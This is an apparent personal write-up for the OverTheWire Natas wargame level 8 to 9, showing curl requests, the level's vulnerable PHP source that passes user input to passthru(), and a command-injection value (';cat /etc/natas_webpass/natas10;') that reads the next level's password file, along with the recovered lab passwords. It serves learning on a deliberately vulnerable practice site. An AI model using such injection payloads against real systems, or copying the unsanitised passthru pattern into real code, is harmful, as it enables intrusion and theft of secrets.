# Natas Level 8 -> 9

## 🧠 Goal

Find password to the next level

---

## 🔐 Credentials

- **Username:** `natas9`  
- **Host:** `natas9.natas.labs.overthewire.org`   
- **Port:** `80` (HTTP)  
- **Password:** `ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t` 

---

## 🖥️ Commands Used

```bash
┌──(amro㉿amro)-[~]
└─$ curl -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t natas9.natas.labs.overthewire.org
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas9", "pass": "ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" };</script></head>
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
view source
```bash
┌──(amro㉿amro)-[~]
└─$ curl -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t natas9.natas.labs.overthewire.org/index-source.html | html2text
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2924  100  2924    0     0  12468      0 --:--:-- --:--:-- --:--:-- 12495
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/
css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-
ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/
wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></
script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas9", "pass": "<censored>" };</
script></head>
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing:
 <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

```
search for something
```bash
┌──(amro㉿amro)-[~]
└─$ curl -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t natas9.natas.labs.overthewire.org --data "needle=kk&submit=Search" |html2text
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1208  100  1185  100    23   4973     96 --:--:-- --:--:-- --:--:--  5075
****** natas9 ******
Find words containing:[needle              ][Search]

Output:
bookkeeper
bookkeeper's
bookkeepers
bookkeeping
bookkeeping's
jackknife
jackknife's
jackknifed
jackknifes
jackknifing
jackknives
trekked
trekking
yakked
yakking
View sourcecode
```
```
┌──(amro㉿amro)-[~]
└─$ curl -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t natas9.natas.labs.overthewire.org --data "needle=;cat /etc/natas_webpass/natas10;&submit=Search" |html2text
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1110  100  1057  100    53   4353    218 --:--:-- --:--:-- --:--:--  4586
****** natas9 ******
Find words containing:[needle              ][Search]

Output:
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
View sourcecode

```
___

## 💡 Theory
The form is searching for words containing a certain substring.

Viewing the source (Ctrl+U or right-click → View Page Source) shows:

<form>
Find words containing: <input name=needle><input type=submit>
</form>
<pre>
<?php
passthru("grep -i $needle dictionary.txt");
?>
</pre>

🛠️ passthru() in PHP — What is it?

passthru() is a PHP function used to execute external programs (i.e. system shell commands) and display raw output directly to the browser.

🔥 passthru() is dangerous if user input is not sanitized. It's vulnerable to command injection.

Exploit the Vulnerability
You can inject additional commands into the input field.

Try:

; cat /etc/natas_webpass/natas10

Explanation:

; ends the grep command

cat /etc/natas_webpass/natas10 reads the next level's password

So the full command becomes:

	grep -i ; cat /etc/natas_webpass/natas10 dictionary.txt


```bash
;cat /etc/natas_webpass/natas10;
```
___

## 📤 Output
```bash
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```
